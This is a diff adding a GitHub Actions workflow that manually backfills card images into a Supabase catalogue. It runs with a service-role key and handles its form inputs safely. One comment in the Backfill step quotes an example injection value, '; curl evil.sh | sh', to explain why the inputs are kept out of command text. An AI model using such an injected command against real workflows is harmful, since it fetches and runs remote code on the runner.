@@ -1,0 +1,120 @@
+# Fill in card art, from a button in the browser.
+#
+# The backfill needs two things that don't belong in the app: a Supabase key
+# powerful enough to write to the catalogue, and a few minutes of running time.
+# Rather than needing a checkout and a terminal to do it, this runs it on
+# GitHub — Actions tab → this workflow → "Run workflow".
+#
+# MANUAL ONLY. No push or schedule trigger on purpose: it holds the
+# service-role key, so it should run when someone asks it to and never as a
+# side effect of a commit.
+#
+# Set up once, in Settings → Secrets and variables → Actions:
+#   NEXT_PUBLIC_SUPABASE_URL     the project URL, https://xxxx.supabase.co
+#   SUPABASE_SERVICE_ROLE_KEY    the service_role key, NOT the anon one
+#
+# Requires migration 022 to have been applied first, or every row fails to
+# write. Safe to run more than once: rows already answered are skipped.
+name: Backfill card images
+
+on:
+  workflow_dispatch:
+    inputs:
+      dry_run:
+        description: "Look, don't write (leave ticked for a first run)"
+        type: boolean
+        default: true
+      only_set:
+        description: 'One set only, e.g. Prismatic Evolutions (blank = all)'
+        type: string
+        default: ''
+      limit:
+        description: 'Stop after this many rows (blank = no limit)'
+        type: string
+        default: ''
+      recheck:
+        description: 'Re-ask about cards already checked'
+        type: boolean
+        default: false
+
+# Read-only: this writes to Supabase, never back to the repo.
+permissions:
+  contents: read
+
+# Two of these running at once would ask tcgdex for everything twice and race
+# each other's writes.
+concurrency:
+  group: backfill-images
+  cancel-in-progress: false
+
+jobs:
+  backfill:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: npm
+
+      # Falls back to a plain install: a lockfile that has drifted shouldn't
+      # turn a one-click job into a puzzle.
+      - name: Install
+        run: npm ci --no-audit --no-fund || npm install --no-audit --no-fund
+
+      - name: Check the secrets are set
+        env:
+          URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
+          KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+        run: |
+          missing=""
+          [ -n "$URL" ] || missing="$missing NEXT_PUBLIC_SUPABASE_URL"
+          [ -n "$KEY" ] || missing="$missing SUPABASE_SERVICE_ROLE_KEY"
+          if [ -n "$missing" ]; then
+            echo "::error::Missing repository secret(s):$missing — add them under Settings → Secrets and variables → Actions."
+            exit 1
+          fi
+
+      # Inputs arrive as environment variables and go into an argv array, never
+      # into the text of a command. Interpolating ${{ inputs.* }} straight into
+      # a run block lets whoever fills the form write shell — the set name is a
+      # free-text box, and "; curl evil.sh | sh" is a valid thing to type in it.
+      - name: Backfill
+        env:
+          NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
+          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+          DRY_RUN: ${{ inputs.dry_run }}
+          RECHECK: ${{ inputs.recheck }}
+          ONLY_SET: ${{ inputs.only_set }}
+          ROW_LIMIT: ${{ inputs.limit }}
+        run: |
+          set -o pipefail
+          args=()
+          [ "$DRY_RUN" = "true" ] && args+=(--dry-run)
+          [ "$RECHECK" = "true" ] && args+=(--recheck)
+          [ -n "$ONLY_SET" ] && args+=(--set "$ONLY_SET")
+          [ -n "$ROW_LIMIT" ] && args+=(--limit "$ROW_LIMIT")
+          echo "Running with: ${args[*]:-(no flags — writing everything)}"
+          node scripts/backfill-images.mjs "${args[@]}" | tee run.log
+
+      # The summary is what the run actually looks like from a browser: the
+      # raw log is there if it's needed, but the numbers shouldn't require
+      # scrolling through one line per set to find.
+      - name: Summary
+        if: always()
+        env:
+          DRY_RUN: ${{ inputs.dry_run }}
+        run: |
+          {
+            echo "### Card image backfill"
+            echo
+            if [ "$DRY_RUN" = "true" ]; then
+              echo "**Dry run — nothing was written.** Untick \"Look, don't write\" to apply it."
+              echo
+            fi
+            echo '```'
+            sed -n '/^---/,$p' run.log 2>/dev/null | head -40 || echo "(no output — see the step log above)"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
